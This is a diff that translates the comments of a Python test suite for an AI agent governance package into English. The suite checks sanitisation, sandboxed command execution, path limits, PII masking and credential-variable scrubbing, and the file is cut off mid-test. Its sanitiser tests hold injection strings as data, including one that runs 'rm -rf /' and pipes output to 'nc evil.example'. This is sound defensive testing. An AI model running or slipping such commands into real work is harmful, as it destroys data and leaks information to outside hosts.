@@ -1,17 +1,17 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""test-method-patterns.py — micro 档 LLM Agent 治理技能包自检测试（四类断言）。
+"""test-method-patterns.py — self-check suite for the micro-tier LLM Agent governance skill package (four assertion classes).
 
-A. 行为测试     —— 从 references/method-patterns.md 第 3 节（Shared Code Templates）
-                   提取 ```python 代码块，exec 到独立命名空间后调用测试。
-                   这是对权威源文件的测试，不是内联副本（防止契约/代码/测试三者脱节）。
-B. 源文件完整性 —— 权威源存在、10 个 def 齐全、[PHONE] 在源中、templates.md 不得存在。
-C. 结构一致性   —— 职能块守恒（micro=18）、升级四件套、13 个治理文件、prompts 约束、
-                   language_policy、SKILL.md 索引化。
-D. 不可变边界   —— 升级提案包不得修改 tests/、不得变更 permissions 块。
+A. Behaviour tests     — extract the ```python code blocks of section 3 (Shared Code Templates)
+                   in references/method-patterns.md, exec them into an isolated namespace and call them.
+                   This tests the authoritative source, not an inline copy (keeps contract, code and tests from drifting apart).
+B. Source integrity — the authoritative source exists, all 10 defs are present, [PHONE] is in the source, templates.md must not exist.
+C. Structural consistency — function-block conservation (micro=18), the four scaling files, the 13 governance files,
+                   prompt constraints, language_policy, and SKILL.md staying index-only.
+D. Immutable boundary — an upgrade package must not modify tests/ or change the permissions block.
 
-运行方式：python tests/test-method-patterns.py   （退出码正确传递：全绿 = 0）
-仅依赖标准库。时间一律使用 datetime.now(timezone.utc)（utcnow 已弃用）。
+Run with: python tests/test-method-patterns.py   (the exit code propagates: all green = 0)
+Standard library only. Always use datetime.now(timezone.utc) (utcnow is deprecated).
 """
 
 import json
@@ -28,18 +28,18 @@ from datetime import datetime, timedelta, timezone
 from pathlib import Path
 
 # ─────────────────────────────────────────────────────────────────────────────
-# 包参数（micro 档）。SKILL_DIR 由测试文件位置相对推导，禁止硬编码绝对路径。
+# Package parameters (micro tier). SKILL_DIR is derived relatively from the test-file location; hardcoded absolute paths are forbidden.
 # ─────────────────────────────────────────────────────────────────────────────
 SKILL_DIR = Path(__file__).resolve().parent.parent
-WORKSPACE_ROOT = SKILL_DIR.parent  # {WORKSPACE_ROOT} 占位符对应的实际根
+WORKSPACE_ROOT = SKILL_DIR.parent  # the real root behind the {WORKSPACE_ROOT} placeholder
 
 SCALE_TIER = "micro"
 SKILL_VERSION = "1.0.0"
 
-AUTHORITATIVE_SOURCE = "references/method-patterns.md"  # ★ 唯一权威源
-LEGACY_TEMPLATES_FILE = "references/templates.md"       # R3-2 已取消，不得存在
+AUTHORITATIVE_SOURCE = "references/method-patterns.md"  # ★ the single authoritative source
+LEGACY_TEMPLATES_FILE = "references/templates.md"       # cancelled by R3-2; must not exist
 
-# 3.1–3.10 顺序固定，不得重排
+# 3.1-3.10 are order-fixed and must never be reordered
 TEN_TEMPLATE_NAMES = [
     "validate_input_schema",
     "sanitize_user_query",
@@ -53,7 +53,7 @@ TEN_TEMPLATE_NAMES = [
     "build_prompt_from_template",
 ]
 
-# §7.1 十个模板的精确签名（H3 要求 human-paste prompt 自带该清单）
+# §7.1 exact signatures of the ten templates (H3 requires a human-paste prompt to carry this list)
 TEN_TEMPLATE_SIGNATURES = [
     "validate_input_schema(data, schema)",
     "sanitize_user_query(query)",
@@ -67,23 +67,23 @@ TEN_TEMPLATE_SIGNATURES = [
     "build_prompt_from_template(template, **kwargs)",
 ]
 
-# 职能块守恒（README-FOR-AI.md §10.1）：XS/S/M/L = 18，G = 36
+# Function-block conservation (README-FOR-AI.md §10.1): XS/S/M/L = 18, G = 36
 EXPECTED_FB_BY_TIER = {"micro": 18, "small": 18, "medium": 18, "large": 18, "group": 36}
 EXPECTED_FB_TOTAL = EXPECTED_FB_BY_TIER[SCALE_TIER]
-# micro（XS）档各部门职能块数
+# Function blocks per department at the micro (XS) tier
 EXPECTED_DEPARTMENT_BLOCKS = {
     "governance-and-delivery.md": 8,
     "engineering-and-safety.md": 10,
 }
 
-# 13 个治理与社区文件（R3-7，审核后 12→13），大小写须与规格一致
+# The 13 governance and community files (R3-7: 12 to 13 after review); case must match the spec exactly
 GOVERNANCE_FILES = [
     ".editorconfig", ".gitignore", "AGENTS.md", "CHANGELOG.md", "CODE_OF_CONDUCT.md",
     "CONTRIBUTING.md", "LICENSE", "README.en.md", "README.md", "README.zh.md",
     "SECURITY.md", "SKILL.md", "_meta.json",
 ]
 
-# README-FOR-AI.md §9.1 权限声明（逐字符照抄，自我升级也不得改动）——D 类断言的基线
+# README-FOR-AI.md §9.1 permissions declaration (copied character-for-character; self-upgrade may not change it) — the D-class baseline
 BASELINE_PERMISSIONS = [
     "files:",
     'read: ["{WORKSPACE_ROOT}/**", "{SKILL_DIR}/**"]',
@@ -99,16 +99,16 @@ PYTHON_BLOCK_RE = re.compile(r"```python[ \t]*\r?\n(.*?)```", re.DOTALL)
 HEADING_RE = re.compile(r"^(#{1,6})\s*(.*)$")
 
 # ─────────────────────────────────────────────────────────────────────────────
-# 2026-10-14 初审（H-1..H-4 / M-1..M-4）回归防线：包文件集与文档锚点的共享工具。
-# 包文件集边界 = 仓库工具目录与环境残留之外的全部文件（README-FOR-AI.md §3）；
-# 与 scripts/self-scale.ps1 的 $ExcludedDirSegments / Get-PackageRelativePaths
-# 保持同一口径。
+# 2026-10-14 initial-review (H-1..H-4 / M-1..M-4) regression line: shared helpers for the package file set and doc anchors.
+# Package file set boundary = every file outside the repository tooling directories and build residue (README-FOR-AI.md §3);
+# it keeps the same basis as $ExcludedDirSegments / Get-PackageRelativePaths in
+# scripts/self-scale.ps1.
 # ─────────────────────────────────────────────────────────────────────────────
 PACKAGE_EXCLUDED_DIRS = {".git", ".github", ".workbuddy", ".skill-upgrade"}
 
 
 def package_relative_paths(root=SKILL_DIR):
-    """包文件集：root 下属于包内容的文件，posix 相对路径，升序。"""
+    """Package file set: files under root that are package content, as posix relative paths, sorted."""
     out = []
     for path in Path(root).rglob("*"):
         if not path.is_file():
@@ -126,7 +126,7 @@ def package_relative_paths(root=SKILL_DIR):
 
 
 def readme_tree_paths(doc="README.md"):
-    """解析 README 的 Project Structure 代码块，返回其中列出的相对路径。"""
+    """Parse the README Project Structure code block and return the relative paths it lists."""
     text = (SKILL_DIR / doc).read_text(encoding="utf-8")
     m = re.search(r"```text\n(.*?)```", text, re.S)
     if not m:
@@ -153,7 +153,7 @@ def readme_tree_paths(doc="README.md"):
 
 
 def markdown_sections(path):
-    """收集 level 2-4 标题声明的章节号（如 '3'、'3.1'），跳过代码块内部。"""
+    """Collect the section numbers declared by level 2-4 headings (e.g. '3', '3.1'), skipping code blocks."""
     text = (SKILL_DIR / path).read_text(encoding="utf-8")
     in_fence = False
     sections = set()
@@ -170,12 +170,12 @@ def markdown_sections(path):
 
 
 # ─────────────────────────────────────────────────────────────────────────────
-# 工具函数（仅标准库）
+# Helper functions (standard library only)
 # ─────────────────────────────────────────────────────────────────────────────
 def parse_frontmatter(path):
-    """按行解析 YAML frontmatter（两个 '---' 之间），支持一层嵌套 dict。
+    """Parse the YAML frontmatter line by line (between the two '---'), supporting one level of nested dict.
 
-    不引入外部依赖；值去除首尾引号。够用于 language_policy / metadata 断言。
+    No external dependency; values are stripped of surrounding quotes. Enough for language_policy / metadata assertions.
     """
     text = Path(path).read_text(encoding="utf-8")
     lines = text.splitlines()
@@ -192,7 +192,7 @@ def parse_frontmatter(path):
             in_fm = True
         if not stripped or stripped.startswith("#"):
             continue
-        if re.match(r"^\s", line):  # 嵌套键（一层）
+        if re.match(r"^\s", line):  # nested key (one level)
             m = re.match(r"^\s+([A-Za-z0-9_.-]+)\s*:\s*(.*)$", line)
             if m and current_top is not None:
                 key, value = m.group(1), m.group(2).strip().strip('"').strip("'")
@@ -214,7 +214,7 @@ def parse_frontmatter(path):
 
 
 def extract_permissions_block(path):
-    """提取 SKILL.md 中 permissions: 块（到下一个顶级键为止），返回逐行 strip 后的列表。"""
+    """Return the permissions: block of SKILL.md (up to the next top-level key) as a list of stripped lines."""
     text = Path(path).read_text(encoding="utf-8")
     lines = text.splitlines()
     block = []
@@ -230,14 +230,14 @@ def extract_permissions_block(path):
             continue
         if line.strip() == "":
             continue
-        if re.match(r"^\S", line):  # 下一个顶级键（含结尾 '---'）
+        if re.match(r"^\S", line):  # next top-level key (including the closing '---')
             break
         block.append(line.strip())
     return block
 
 
 def _stdout_of(result):
-    """尽力从常见返回约定（str / dict / tuple / CompletedProcess）提取 stdout 文本。"""
+    """Best-effort extraction of stdout text from the common return shapes (str / dict / tuple / CompletedProcess)."""
     if result is None:
         return ""
     if isinstance(result, bytes):
@@ -268,15 +268,15 @@ def _stdout_of(result):
 
 
 def load_template_namespace():
-    """提取 method-patterns.md 第 3 节（Shared Code Templates）的 ```python 代码块，
-    exec 到独立命名空间并返回。这是对源文件的测试，不是内联副本。
+    """Extract the ```python code blocks of section 3 (Shared Code Templates) from method-patterns.md,
+    exec them into an isolated namespace and return it. This tests the source file, not an inline copy.
     """
     src = SKILL_DIR / AUTHORITATIVE_SOURCE
     text = src.read_text(encoding="utf-8")
     lines = text.splitlines()
 
-    # 收集标题（跳过围栏代码块内部——# 注释行不是标题）
-    headings = []  # (行号, 级别, 标题)
+    # Collect headings (skipping fenced code blocks — a '#' comment line is not a heading)
+    headings = []  # (line index, level, title)
     in_fence = False
     for i, line in enumerate(lines):
         if line.lstrip().startswith("```"):
@@ -288,8 +288,8 @@ def load_template_namespace():
         if m:
             headings.append((i, len(m.group(1)), m.group(2).strip()))
 
-    # 定位第 3 节标题（优先编号形 "## 3. Shared Code Templates"，
-    # 避免匹配到含相同短语的文档大标题）
+    # Locate the section-3 heading (prefer the numbered form "## 3. Shared Code Templates" to
+    # avoid matching a document title that contains the same phrase)
     candidates = [(i, lvl) for i, lvl, title in headings
                   if re.match(r"^3[\.\s、:：]", title)]
     if not candidates:
@@ -297,11 +297,11 @@ def load_template_namespace():
                       if "shared code templates" in title.lower() and lvl >= 2]
     if not candidates:
         raise AssertionError(
-            f"{AUTHORITATIVE_SOURCE} 未找到第 3 节（Shared Code Templates）标题"
+            f"{AUTHORITATIVE_SOURCE} has no section 3 (Shared Code Templates) heading"
         )
     start_idx, level = min(candidates, key=lambda c: (c[1], c[0]))
 
-    # 节边界：下一个同级或更高级标题（同样跳过代码块内部）
+    # Section boundary: the next heading of the same or higher level (also skipping code blocks)
     end_idx = len(lines)
     for i, lvl, _title in headings:
         if i > start_idx and lvl <= level:
@@ -312,7 +312,7 @@ def load_template_namespace():
     blocks = PYTHON_BLOCK_RE.findall(section)
     if not blocks:
         raise AssertionError(
-            f"{AUTHORITATIVE_SOURCE} 第 3 节未包含任何 ```python 代码块"
+            f"{AUTHORITATIVE_SOURCE} section 3 contains no ```python code block"
         )
 
     ns = {"__name__": "method_patterns_source", "__file__": str(src)}
@@ -334,43 +334,43 @@ def load_template_namespace():
             if exc.lineno and 0 < exc.lineno <= len(block.splitlines()):
                 offending = block.splitlines()[exc.lineno - 1].strip()
             raise AssertionError(
-                f"{AUTHORITATIVE_SOURCE} 第 3 节代码块存在语法错误"
-                f"（块内第 {exc.lineno} 行: {exc.msg}; {offending}）"
-                f"——权威源缺陷，须修复 method-patterns.md"
+                f"{AUTHORITATIVE_SOURCE} section 3 code block has a syntax error"
+                f" (block line {exc.lineno}: {exc.msg}; {offending})"
+                f" — authoritative-source defect; fix method-patterns.md"
             ) from exc
     return ns
 
 
 # ═════════════════════════════════════════════════════════════════════════════
-# A. 行为测试（每个模板至少 1 条：正常路径 + 边界）
+# A. Behaviour tests (at least one per template: normal path + boundary)
 # ═════════════════════════════════════════════════════════════════════════════
 class BehaviorTests(unittest.TestCase):
-    """对权威源中 10 个模板的实际行为测试（exec 源代码后调用）。"""
+    """Behaviour tests for the 10 templates in the authoritative source (exec the source, then call)."""
 
     @classmethod
     def setUpClass(cls):
-        # ★ E22：显式固定沙箱根，消除对 CWD 的隐式依赖。
-        # method-patterns.md 模块级以 SKILL_ROOT = os.environ.get("SKILL_DIR", ".")
-        # / WORKSPACE_ROOT = os.environ.get("WORKSPACE_ROOT", ".") 读取根路径，
-        # 缺省回退 "."（即当前工作目录）——故加载命名空间前必须先设定环境变量。
+        # ★ E22: pin the sandbox root explicitly, removing the implicit dependency on CWD.
+        # method-patterns.md reads SKILL_ROOT = os.environ.get("SKILL_DIR", ".")
+        # / WORKSPACE_ROOT = os.environ.get("WORKSPACE_ROOT", ".") at module level,
+        # falling back to "." (the current working directory) — so the env vars must be set before loading the namespace.
         os.environ.setdefault("SKILL_DIR", str(SKILL_DIR))
         os.environ.setdefault("WORKSPACE_ROOT", str(WORKSPACE_ROOT))
         cls.ns = load_template_namespace()
         missing = [n for n in TEN_TEMPLATE_NAMES if not callable(cls.ns.get(n))]
         if missing:
             raise AssertionError(
-                f"{AUTHORITATIVE_SOURCE} 第 3 节缺少模板实现: {missing}"
+                f"{AUTHORITATIVE_SOURCE} section 3 is missing template implementations: {missing}"
             )
 
     def _fn(self, name):
         fn = self.ns.get(name)
-        self.assertTrue(callable(fn), f"模板 {name} 不可调用")
+        self.assertTrue(callable(fn), f"template {name} is not callable")
         return fn
 
-    # ── 1. validate_input_schema：合法输入通过 / 非法输入拒绝 ──────────────────
+    # ── 1. validate_input_schema: valid input passes / invalid input is rejected ──────────────────
     def test_validate_input_schema(self):
         fn = self._fn("validate_input_schema")
-        # 自适应探测实现所讲的 schema 方言，再在该方言下断言 通过/拒绝
+        # Probe which schema dialect the implementation speaks, then assert pass/reject under that dialect
         dialects = [
             ({"name": {"type": str, "required": True},
               "age": {"type": int, "required": False}},
@@ -384,7 +384,7 @@ class BehaviorTests(unittest.TestCase):
             ({"name": str, "age": int}, {"name": 12345, "age": "twenty"}),
             ({"name": "str", "age": "int"}, {"name": 12345, "age": "twenty"}),
             ({"name": "string", "age": "integer"}, {"name": 12345, "age": "twenty"}),
-            ({"required": ["name", "age"]}, {"name": "alice"}),  # 缺必填键
+            ({"required": ["name", "age"]}, {"name": "alice"}),  # missing required key
             ({"type": "object",
               "properties": {"name": {"type": "string"}, "age": {"type": "integer"}},
               "required": ["name", "age"]},
@@ -402,69 +402,69 @@ class BehaviorTests(unittest.TestCase):
                 break
         self.assertIsNotNone(
             chosen,
-            "validate_input_schema 拒绝了所有常见 schema 方言下的合法输入",
+            "validate_input_schema rejected valid input under every common schema dialect",
         )
         schema, invalid = chosen
         try:
             ret = fn(dict(invalid), schema)
             rejected = ret is False or ret is None
         except Exception:
-            rejected = True  # 抛异常拒绝亦合法
-        self.assertTrue(rejected, "非法输入未被拒绝（正常路径通过但边界失效）")
+            rejected = True  # rejecting by raising is also valid
+        self.assertTrue(rejected, "invalid input was not rejected (normal path passes but the boundary is broken)")
 
-    # ── 2. sanitize_user_query：普通查询不变 / shell 元字符被净化 ──────────────
+    # ── 2. sanitize_user_query: a plain query is unchanged / shell metacharacters are neutralised ──
     def test_sanitize_user_query(self):
         fn = self._fn("sanitize_user_query")
         plain = "summarize the quarterly delivery report"
-        self.assertEqual(fn(plain), plain, "普通查询不应被改动")
+        self.assertEqual(fn(plain), plain, "a plain query must not be changed")
         dirty = "report; rm -rf / && echo `whoami` $(id) | nc evil.example"
         try:
             out = fn(dirty)
         except Exception:
-            return  # 拒绝危险输入亦为合法净化策略
-        self.assertIsInstance(out, str, "净化结果应为字符串")
+            return  # rejecting dangerous input is also a valid sanitisation strategy
+        self.assertIsInstance(out, str, "the sanitised result must be a string")
         for bad in (";", "&&", "`", "$(", "|"):
-            self.assertNotIn(bad, out, f"shell 元字符未被净化: {bad!r}")
+            self.assertNotIn(bad, out, f"shell metacharacter was not neutralised: {bad!r}")
 
-    # ── 3. execute_safe_command：超时生效 / cwd 受限 ──────────────────────────
+    # ── 3. execute_safe_command: the timeout takes effect / cwd is restricted ─────────────────────
     def test_execute_safe_command(self):
         fn = self._fn("execute_safe_command")
         code = "import os; print('CWDPROBE=' + os.getcwd())"
 
-        # 正常路径：良性命令成功执行，且 cwd 被钉在受限范围（技能目录或沙箱临时目录）
+        # Normal path: a benign command runs, and cwd is pinned to a restricted scope (the skill dir or a sandbox temp dir)
         result = None
         last_err = None
         for cmd in ([sys.executable, "-c", code], f'"{sys.executable}" -c "{code}"'):
             try:
                 result = fn(cmd, timeout=30)
                 break
-            except Exception as exc:  # noqa: BLE001 —— 自适应命令形态
+            except Exception as exc:  # noqa: BLE001 — adaptive command shape
                 last_err = exc
         if result is None:
-            self.fail(f"execute_safe_command 两种命令形态均无法执行: {last_err!r}")
+            self.fail(f"execute_safe_command could not run either command shape: {last_err!r}")
         out = _stdout_of(result)
-        self.assertIn("CWDPROBE=", out, "良性命令未成功执行或输出不可读")
+        self.assertIn("CWDPROBE=", out, "the benign command did not run or its output is unreadable")
         m = re.search(r"CWDPROBE=(\S+)", out)
         cwd = Path(m.group(1)).resolve()
-        # 只允许 {WORKSPACE_ROOT}：把技能目录与沙箱临时目录也算"受限"，就无法
-        # 发现 cwd=None（继承包根目录）的实现。
+        # {WORKSPACE_ROOT} only: counting the skill dir and a sandbox temp dir as "restricted" would fail
+        # to catch an implementation with cwd=None (inheriting the package root).
         allowed_roots = [WORKSPACE_ROOT.resolve()]
         self.assertTrue(
             any(cwd == root or root in cwd.parents for root in allowed_roots),
-            f"cwd 不受限: {cwd}（应位于 {{WORKSPACE_ROOT}}、技能目录或沙箱临时目录内）",
+            f"cwd is not restricted: {cwd} (expected under {{WORKSPACE_ROOT}}, the skill dir or a sandbox temp dir)",
         )
 
-        # 边界：超时生效（挂死命令必须在 timeout 内被切断）
+        # Boundary: the timeout takes effect (a hung command must be cut off within the timeout)
         hang = "import time; time.sleep(10)"
         start = time.monotonic()
         try:
             fn([sys.executable, "-c", hang], timeout=1)
         except Exception:
-            pass  # 以异常形式报告超时亦合法
+            pass  # reporting the timeout as an exception is also valid
         elapsed = time.monotonic() - start
-        self.assertLess(elapsed, 5.0, f"超时未生效: 挂死命令耗时 {elapsed:.1f}s")
+        self.assertLess(elapsed, 5.0, f"timeout did not take effect: hung command took {elapsed:.1f}s")
 
-    # ── 4. format_output_json：含 AIGC 标签与时间戳 ──────────────────────────
+    # ── 4. format_output_json: carries the AIGC label and a timestamp ────────────────────────────
     def test_format_output_json(self):
         fn = self._fn("format_output_json")
         now = datetime.now(timezone.utc)
@@ -485,25 +485,25 @@ class BehaviorTests(unittest.TestCase):
                     data = None
         else:
             data, text = None, str(res)
-        # 标准 JSON（结构化或可解析的 JSON 字符串）
-        self.assertIsInstance(data, dict, "输出必须是合法 JSON 对象")
-        # AIGC 标签（显式声明或元数据字段）
+        # Standard JSON (structured, or a parseable JSON string)
+        self.assertIsInstance(data, dict, "the output must be a valid JSON object")
+        # AIGC labels (explicit declaration or metadata fields)
         self.assertRegex(
             text, r"(?i)ai[-_ ]?generated",
-            "输出缺少 AIGC 标签",
+            "the output is missing the AIGC label",
         )
         if isinstance(data, dict):
             self.assertIs(data.get("ai_generated"), True,
-                          "结构化输出应含 ai_generated: true 元数据")
+                          "structured output should carry ai_generated: true metadata")
             ts = data.get("generated_at") or data.get("timestamp") or data.get("created_at")
             if isinstance(ts, str):
-                self.assertRegex(ts, r"\d{4}-\d{2}-\d{2}", "时间戳格式应为 ISO8601")
+                self.assertRegex(ts, r"\d{4}-\d{2}-\d{2}", "the timestamp must be ISO8601")
         else:
             self.assertRegex(text, r"\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}",
-                             "输出缺少时间戳")
-        self.assertIn("Quarterly summary content", text, "内容本体丢失")
-        self.assertIn("test-provider", text, "provider 信息丢失")
-        # 时间戳不得超前于当前时刻（以 UTC 为基准）
+                             "the output is missing a timestamp")
+        self.assertIn("Quarterly summary content", text, "the content body was lost")
+        self.assertIn("test-provider", text, "the provider information was lost")
+        # The timestamp must not be ahead of the current moment (UTC basis)
         ts_match = re.search(r"(\d{4}-\d{2}-\d{2})[T ](\d{2}:\d{2})", text)
         if ts_match:
             try:
@@ -512,17 +512,17 @@ class BehaviorTests(unittest.TestCase):
                 ).replace(tzinfo=timezone.utc)
                 self.assertLessEqual(
                     stamp, now + timedelta(minutes=5),
-                    "时间戳超前于当前 UTC 时间",
+                    "the timestamp is ahead of the current UTC time",
                 )
             except ValueError:
                 pass
-        # 边界：非 ASCII 内容不崩溃
-        out2 = fn("中文摘要内容", "test-provider")
-        self.assertIn("中文摘要内容", _stdout_of(out2) if not isinstance(out2, (str, dict)) else (
+        # Boundary: non-ASCII content does not crash
+        out2 = fn("café — résumé", "test-provider")
+        self.assertIn("café — résumé", _stdout_of(out2) if not isinstance(out2, (str, dict)) else (
             out2 if isinstance(out2, str) else json.dumps(out2, ensure_ascii=False, default=str)
         ))
 
-    # ── 5. retry_with_backoff：首次失败后重试成功 / 达上限后抛出 ──────────────
+    # ── 5. retry_with_backoff: retries succeed after a transient failure / raises at the limit ───
     def test_retry_with_backoff_success_after_transient_failure(self):
         fn = self._fn("retry_with_backoff")
         last_err = None
@@ -540,11 +540,11 @@ class BehaviorTests(unittest.TestCase):
             except Exception as exc:  # noqa: BLE001
                 last_err = exc
                 continue
-            self.assertEqual(ret, "recovered", "重试成功后应返回函数结果")
-            self.assertGreaterEqual(calls["n"], 2, "首次失败后未发生重试")
+            self.assertEqual(ret, "recovered", "a successful retry should return the function result")
+            self.assertGreaterEqual(calls["n"], 2, "no retry happened after the first failure")
             return
         self.fail(
-            f"首次失败后重试未成功（各异常类型均直接抛出，最后: {last_err!r}）"
+            f"the retry did not succeed after the first failure (every exception type raised straight through; last: {last_err!r})"
         )
 
     def test_retry_with_backoff_raises_after_limit(self):
@@ -560,25 +560,25 @@ class BehaviorTests(unittest.TestCase):
                 fn(boom, max_retries=2)
             except Exception:
                 if calls["n"] >= 2:
-                    self.assertLessEqual(calls["n"], 3, "重试次数超出上限")
+                    self.assertLessEqual(calls["n"], 3, "the number of retries exceeded the limit")
                     return
-                continue  # 该异常类型未被重试，换类型再试
+                continue  # this exception type is not retried; try another type
             if calls["n"] >= 2:
-                self.fail("达到重试上限后应抛出异常，而非静默返回")
+                self.fail("reaching the retry limit should raise, not return silently")
                 return
             continue
-        self.fail("未观察到「重试后仍失败则抛出」的行为")
+        self.fail("never observed the 'raise after retries still fail' behaviour")
 
-    # ── 6. read_reference_file：允许路径可读 / 越界路径拒绝 ───────────────────
+    # ── 6. read_reference_file: allowed paths are readable / out-of-bounds paths are rejected ─────
     def test_read_reference_file(self):
         fn = self._fn("read_reference_file")
 
-        # 正常路径：只读断言——直接读取包内已存在的真实文件（不写任何探针，
-        # 中断不会残留文件污染包树），且内容须与直读结果逐字符一致
+        # Normal path: a read-only assertion — read a real file that already exists in the package (no probe is written,
+        # so an interruption leaves no file polluting the package tree), and its content must match a direct read character for character
         candidates = ["references/error-codes.md", "references/scaling.md",
                       "references/method-patterns.md"]
         existing = [c for c in candidates if (SKILL_DIR / c).is_file()]
-        self.assertTrue(existing, "references/ 下缺少可用于只读断言的真实文件")
+        self.assertTrue(existing, "references/ has no real file usable for the read-only assertion")
         read_ok = False
         for rel in existing:
             expected = (SKILL_DIR / rel).read_text(encoding="utf-8")
@@ -589,35 +589,35 @@ class BehaviorTests(unittest.TestCase):
             if isinstance(out, str) and out == expected:
                 read_ok = True
                 break
-        self.assertTrue(read_ok, "允许路径（references/ 内真实文件）应可读且内容一致")
+        self.assertTrue(read_ok, "an allowed path (a real file under references/) should be readable with identical content")
 
-        # 边界：越界路径必须抛 PermissionError 拒绝（只读探测，无需落盘）。
-        # 此前的写法是"返回内容包含包外文件前 200 字符才算失败"，而探针目标
-        # WORKSPACE_ROOT/README-FOR-AI.md 并不存在，secret_head 恒为空，于是
-        # rejected 恒为 True —— 一条永不生效的空断言（README-FOR-AI.md §13/§14.5）。
+        # Boundary: an out-of-bounds path must raise PermissionError (a read-only probe, nothing written to disk).
+        # The old form was 'fail only if the content contains the first 200 characters of an outside file', but the probe
+        # target WORKSPACE_ROOT/README-FOR-AI.md does not exist, so secret_head was always empty and rejected was
+        # always True — a permanently vacuous assertion (README-FOR-AI.md §13/§14.5).
         temp_outside = Path(tempfile.gettempdir()).resolve() / "oob-probe.md"
         rel_outside = os.path.relpath(temp_outside, SKILL_DIR)
         probes = ["../outside.md", str(temp_outside),
                   rel_outside, rel_outside.replace("\\", "/")]
         for p in probes:
-            with self.assertRaises(PermissionError, msg=f"越界路径未被拒绝: {p}"):
+            with self.assertRaises(PermissionError, msg=f"out-of-bounds path was not rejected: {p}"):
                 fn(p)
 
-    # ── 7. generate_trace_id：默认前缀 / 自定义前缀 / 唯一性 ──────────────────
+    # ── 7. generate_trace_id: default prefix / custom prefix / uniqueness ────────────────────────
     def test_generate_trace_id(self):
         fn = self._fn("generate_trace_id")
         default = fn()
-        self.assertIsInstance(default, str, "trace id 应为字符串")
+        self.assertIsInstance(default, str, "a trace id must be a string")
         self.assertTrue(default.lower().startswith("trace"),
-                        "默认前缀应为 trace")
+                        "the default prefix should be trace")
         custom = fn(prefix="req")
         self.assertTrue(custom.lower().startswith("req"),
-                        "自定义前缀应生效")
+                        "the custom prefix should take effect")
         self.assertNotEqual(default, custom)
         ids = {fn() for _ in range(50)}
-        self.assertEqual(len(ids), 50, "trace id 必须唯一（50 次调用出现重复）")
+        self.assertEqual(len(ids), 50, "trace ids must be unique (a duplicate appeared in 50 calls)")
 
-    # ── 8. check_rate_limit：窗口内通过 / 超限拒绝 ────────────────────────────
+    # ── 8. check_rate_limit: passes within the window / rejects past the limit ───────────────────
     def test_check_rate_limit(self):
         fn = self._fn("check_rate_limit")
 
@@ -625,15 +625,15 @@ class BehaviorTests(unittest.TestCase):
             try:
                 ret = fn(identifier, limit=limit, window=window)
             except Exception:
-                return False  # 超限抛异常亦为拒绝
+                return False  # raising on over-limit is also a rejection
             return ret is not False and ret is not None
 
         ident = "test-rate-" + uuid.uuid4().hex
         for _ in range(3):
-            self.assertTrue(allowed(ident, 3, 60), "窗口内（未超 limit）应通过")
-        self.assertFalse(allowed(ident, 3, 60), "超过 limit 后应被拒绝")
+            self.assertTrue(allowed(ident, 3, 60), "within the window (below limit) should pass")
+        self.assertFalse(allowed(ident, 3, 60), "past the limit should be rejected")
 
-    # ── 9. mask_sensitive_data：email / IP / phone 三类均脱敏 ──────────────────
+    # ── 9. mask_sensitive_data: email / IP / phone are all masked ────────────────────────────────
     def test_mask_sensitive_data(self):
         fn = self._fn("mask_sensitive_data")
         text = ("Contact john.doe@example.com from 192.168.1.100 "
@@ -646,13 +646,13 @@ class BehaviorTests(unittest.TestCase):
             ("13812345678", "[PHONE]"),
         ]
         for raw, label in cases:
-            self.assertNotIn(raw, out, f"敏感数据未脱敏: {raw}")
-            self.assertIn(label, out, f"缺少脱敏占位符: {label}")
-        # 边界：无 PII 的文本保持不变
+            self.assertNotIn(raw, out, f"sensitive data was not masked: {raw}")
+            self.assertIn(label, out, f"missing masking placeholder: {label}")
+        # Boundary: text without PII is unchanged
         clean = "No sensitive data here, ticket 12345."
-        self.assertEqual(fn(clean), clean, "无 PII 文本不应被改动")
+        self.assertEqual(fn(clean), clean, "text without PII must not be changed")
 
-    # ── 10. build_prompt_from_template：模板填充 / 输入被净化 ─────────────────
+    # ── 10. build_prompt_from_template: template filling / inputs are sanitised ──────────────────
     def test_build_prompt_from_template(self):
         fn = self._fn("build_prompt_from_template")
         tmpl = None
@@ -669,25 +669,25 @@ class BehaviorTests(unittest.TestCase):
             if isinstance(out, str) and "AI governance" in out:
                 tmpl = candidate
                 break
-        self.assertIsNotNone(tmpl, "模板填充失败：常见占位符语法均未生效")
-        # 边界：kwargs 输入先净化（拒绝或去除元字符均可）
+        self.assertIsNotNone(tmpl, "template filling failed: no common placeholder syntax took effect")
+        # Boundary: kwargs inputs are sanitised first (reject or strip metacharacters, either is valid)
         try:
             out2 = fn(tmpl, topic="safe; rm -rf / `whoami`")
         except Exception:
-            return  # 拒绝危险输入亦为合法净化策略
+            return  # rejecting dangerous input is also a valid sanitisation strategy
         self.assertIsInstance(out2, str)
         for bad in (";", "`"):
-            self.assertNotIn(bad, out2, f"kwargs 输入未被净化: {bad!r}")
+            self.assertNotIn(bad, out2, f"kwargs input was not sanitised: {bad!r}")
 
-    # ══ ★ R4 回归：2026-09-28 实质审查缺陷（H-2 / M-2 / M-4 / L-3 / L-4 / L-6）══
-    # 这些缺陷的共同特征：清单审查全部通过，但机制跑起来不管用。故每条断言都
-    # 直接调用权威源的真实函数，而不是再次核对文档措辞。
+    # ══ ★ R4 regression: 2026-09-28 substantive-review defects (H-2 / M-2 / M-4 / L-3 / L-4 / L-6) ══
+    # These defects share one trait: the checklist review passed while the mechanism did not work. So every
+    # assertion calls the real function in the authoritative source instead of re-checking document wording.
 
     def test_credential_env_scrubbing_covers_real_names(self):
-        """★ H-2：凭证擦除必须覆盖真实世界的变量命名，而非仅前缀匹配。
+        """★ H-2: credential scrubbing must cover real-world variable names, not just prefixes.
 
-        前缀匹配（api_/token/secret/password/key_）实测泄漏 AWS_SECRET_ACCESS_KEY、
-        GITHUB_TOKEN、OPENAI_APIKEY 等 12 个名字 —— 它们都不以被封前缀开头。
+        Prefix matching (api_/token/secret/password/key_) was measured leaking AWS_SECRET_ACCESS_KEY,
+        GITHUB_TOKEN, OPENAI_APIKEY and 9 more names — none of them start with a blocked prefix.
         """
         is_secret = self._fn("_is_secret_env_name")
         leaked = [
@@ -696,8 +696,8 @@ class BehaviorTests(unittest.TestCase):
             "PRIVATE_KEY", "SESSION_ID", "PASSWD", "NPM_TOKEN", "HF_TOKEN",
         ]
         missed = [n for n in leaked if not is_secret(n)]
-        self.assertEqual([], missed, f"凭证名未被擦除（H-2 复发）: {missed}")
-        # 反向：不得把无害变量一并抹掉，否则子进程无法正常工作
